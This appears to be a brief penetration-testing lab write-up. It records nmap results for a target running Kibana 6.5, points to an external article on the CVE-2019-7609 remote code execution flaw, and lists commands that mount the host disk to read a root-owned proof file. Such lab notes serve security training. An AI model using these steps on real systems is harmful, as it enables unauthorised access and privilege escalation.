# Table of Contents
- [Recon](#recon)
    - [nmap](#nmap)
- [Foothold](#foothold)
    - [Ports](#ports)
        - [56001](#5601)
- [PE](#pe)

# Recon

## nmap
```c
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)  
| ssh-hostkey:  
| 2048 cd:88:cb:33:78:9a:bf:f0:31:57:d9:2f:ae:13:ee:db (RSA)  
| 256 fb:54:3b:ba:f6:68:57:81:e4:65:6e:24:9c:db:6d:8a (ECDSA)  
|_ 256 be:6e:25:d1:88:09:7e:33:40:b3:56:6a:b4:ce:16:0d (ED25519)  
80/tcp open http Apache httpd 2.4.25 ((Debian))  
|_http-server-header: Apache/2.4.25 (Debian)  
|_http-title: PHP Calculator  
3306/tcp open mysql MariaDB (unauthorized)  
5601/tcp open esmagent?  kibana  
24007/tcp open rpcbind  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Linux 3.X|4.X (88%)  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
Aggressive OS guesses: Linux 3.11 - 4.1 (88%), Linux 4.4 (88%), Linux 3.16 (87%), Linux 3.2.0 (87%), Linux 3.13 (86%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 4 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Foothold
## Ports
#### 5601
/app/kibana
    v6.5
    Follow link to get RCE:  https://systemweakness.com/this-kibana-vulnerability-can-give-you-rce-in-a-snap-kibana-cve-2019-7609-7de49112139e

# PE
- Spawn in as root. Find / -name proof.txt 2>/dev/null  ->  didn't find file
- fdisk -l
    mkdir /mnt/own
    mount /dev/sda1 /mnt/own
    cd /mnt/own/root  >  cat proof.txt